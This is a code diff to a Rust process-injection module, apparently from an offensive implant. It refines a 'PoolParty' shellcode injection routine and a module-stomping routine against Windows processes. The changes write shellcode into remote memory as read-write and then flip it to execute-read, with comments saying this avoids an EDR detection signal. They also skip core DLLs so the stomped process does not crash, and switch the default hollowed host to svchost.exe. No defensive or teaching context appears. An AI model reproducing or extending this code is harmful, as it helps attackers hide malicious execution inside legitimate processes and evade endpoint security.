@@ -183,7 +183,7 @@ impl ProcessInjector {
     #[cfg(target_os = "windows")]
     pub async fn poolparty_inject(shellcode: Vec<u8>, target_pid: u32) -> CommandResult {
         use winapi::um::processthreadsapi::OpenProcess;
-        use winapi::um::winnt::{PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
+        use winapi::um::winnt::{PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE};
         
         info!("[*] Initializing PoolParty injection against PID: {}", target_pid);
 
@@ -209,14 +209,34 @@ impl ProcessInjector {
                 
                 // Change protection to allow writing
                 let mut old_protect: u32 = 0;
-                winapi::um::memoryapi::VirtualProtectEx(h_process, target_addr, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);
+                winapi::um::memoryapi::VirtualProtectEx(h_process, target_addr, shellcode.len(), winapi::um::winnt::PAGE_READWRITE, &mut old_protect);
                 
                 let mut written = 0;
                 winapi::um::memoryapi::WriteProcessMemory(h_process, target_addr, shellcode.as_ptr() as *const _, shellcode.len(), &mut written);
+                
+                // Restore to RX (not RWX)
+                winapi::um::memoryapi::VirtualProtectEx(h_process, target_addr, shellcode.len(), winapi::um::winnt::PAGE_EXECUTE_READ, &mut old_protect);
                 target_addr
             } else {
-                // Fallback to traditional allocation
-                winapi::um::memoryapi::VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+                // Fallback: RW alloc → write → change to RX
+                let alloc = winapi::um::memoryapi::VirtualAllocEx(
+                    h_process, ptr::null_mut(), shellcode.len(),
+                    MEM_COMMIT | MEM_RESERVE, winapi::um::winnt::PAGE_READWRITE
+                );
+                if !alloc.is_null() {
+                    let mut written = 0;
+                    winapi::um::memoryapi::WriteProcessMemory(
+                        h_process, alloc, shellcode.as_ptr() as *const _,
+                        shellcode.len(), &mut written
+                    );
+                    // RW → RX (avoid RWX which is an EDR signal)
+                    let mut old_protect: u32 = 0;
+                    winapi::um::memoryapi::VirtualProtectEx(
+                        h_process, alloc, shellcode.len(),
+                        winapi::um::winnt::PAGE_EXECUTE_READ, &mut old_protect
+                    );
+                }
+                alloc
             };
 
             if remote_mem.is_null() {
@@ -256,9 +276,15 @@ impl ProcessInjector {
     /// 在目标进程中寻找适合 Module Stomping 的 DLL
     #[cfg(target_os = "windows")]
     fn find_stomping_target(h_process: HANDLE) -> Option<(PVOID, usize)> {
-        use winapi::um::psapi::{EnumProcessModules, GetModuleInformation, MODULEINFO};
+        use winapi::um::psapi::{EnumProcessModules, GetModuleInformation, GetModuleFileNameExW, MODULEINFO};
         use winapi::shared::minwindef::HMODULE;
         use std::mem;
+
+        // Critical modules to NEVER stomp (would crash the process)
+        const SKIP_MODULES: &[&str] = &[
+            "ntdll.dll", "kernel32.dll", "kernelbase.dll", "user32.dll",
+            "gdi32.dll", "advapi32.dll", "msvcrt.dll", "ucrtbase.dll",
+        ];
 
         let mut h_mods: [HMODULE; 1024] = unsafe { mem::zeroed() };
         let mut cb_needed: u32 = 0;
@@ -266,14 +292,22 @@ impl ProcessInjector {
         unsafe {
             if EnumProcessModules(h_process, h_mods.as_mut_ptr(), mem::size_of_val(&h_mods) as u32, &mut cb_needed) != 0 {
                 let count = (cb_needed as usize) / mem::size_of::<HMODULE>();
-                for i in 0..count {
+                // Skip first module (the EXE itself) and start from index 2+ (skip ntdll)
+                for i in 2..count {
                     let mut mi: MODULEINFO = mem::zeroed();
                     if GetModuleInformation(h_process, h_mods[i], &mut mi, mem::size_of::<MODULEINFO>() as u32) != 0 {
-                        // 我们寻找大于 100KB 的非核心模块（简单的白名单逻辑）
-                        // 逻辑：如果模块基址不是 ImageBase 且 SizeOfImage 足够大
                         if mi.SizeOfImage > 102400 {
-                            // 偏移量：我们通常在模块末尾或 .text 段的空白区注入
-                            // 为了简化，我们选择在模块 0x1000 后的位置
+                            // Get module name to check against skip list
+                            let mut name_buf = [0u16; 260];
+                            let name_len = GetModuleFileNameExW(h_process, h_mods[i], name_buf.as_mut_ptr(), 260);
+                            if name_len > 0 {
+                                let name = String::from_utf16_lossy(&name_buf[..name_len as usize])
+                                    .to_lowercase();
+                                let base_name = name.rsplit('\\').next().unwrap_or(&name);
+                                if SKIP_MODULES.iter().any(|s| *s == base_name) {
+                                    continue;
+                                }
+                            }
                             return Some((mi.lpBaseOfDll, 0x1000));
                         }
                     }
@@ -359,7 +393,7 @@ impl ProcessInjector {
 
         // 使用局部代码块隔离原生未实现 Send 的句柄结构体
         let setup_res: Result<(usize, String, u32), String> = {
-            let target_process = target_exe.unwrap_or("C:\\Windows\\System32\\taskhost.exe");
+            let target_process = target_exe.unwrap_or("C:\\Windows\\System32\\svchost.exe");
             let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
             si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
             let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
